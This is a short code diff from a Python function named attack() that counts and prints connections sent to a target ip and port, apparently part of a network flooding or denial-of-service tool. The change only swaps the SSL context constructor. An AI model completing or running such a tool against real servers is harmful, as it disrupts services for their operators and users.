@@ -101,7 +101,7 @@ def attack():
         num_sent = num_sent + 1
         print("[+] Sent ", num_sent, " => ", ip , ":", port)
         if port == 443:
-            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
+            context = ssl.SSLContext()
             context.options |= ssl.OP_NO_SSLv2
             context.options |= ssl.OP_NO_SSLv3
             context.options |= ssl.OP_NO_TLSv1
